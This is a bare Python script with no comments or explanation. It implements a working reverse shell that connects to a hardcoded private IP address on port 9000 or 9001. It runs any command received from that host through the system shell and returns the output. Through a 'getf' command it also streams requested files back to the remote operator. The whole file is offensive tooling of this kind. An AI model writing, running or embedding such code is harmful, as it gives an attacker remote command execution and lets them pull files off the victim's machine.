import sys
import subprocess
import os
import socket
import sys
s = socket.socket()
host = "192.168.43.147"
port = 9000

try:
    s.connect((host,port))

except socket.error:    
    s.connect((host,port+1))
    
s.send(str.encode(os.getcwd() +" > "))

while True:
    
    data = s.recv(1024)
    data = data.decode("utf-8")
    if data[:2] == "cd":
        try:
            os.chdir(data[3:])
            cwd = os.getcwd() +" > "
            s.send(str.encode(cwd))
        except FileNotFoundError:
            cwd = os.getcwd() +" > "
            s.send(str.encode("Directory does not exist\n " + cwd))

    elif data[:4] == "quit":
        print("closing..")
        s.close()
        sys.exit()

    elif data[:4] == "getf":
        filename = data[5:]
        try:
            f = open(filename,"rb")
            chunk=1
            filesize = str(os.path.getsize(filename))
            s.send(filesize.encode())
            while(chunk):
                chunk = f.read(1024*1024)
                s.send(chunk)
        
            print("Done with sending")
            f.close()
        except FileNotFoundError:
            print("File does not exist")
            s.send('0'.encode())
            
    elif len(data) > 0:
        cmd = subprocess.Popen(data[:],shell=True,stdout = subprocess.PIPE,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        cwd = os.getcwd() +" >"
        s.send(str.encode(output_str + cwd))
        print(output_str)

        
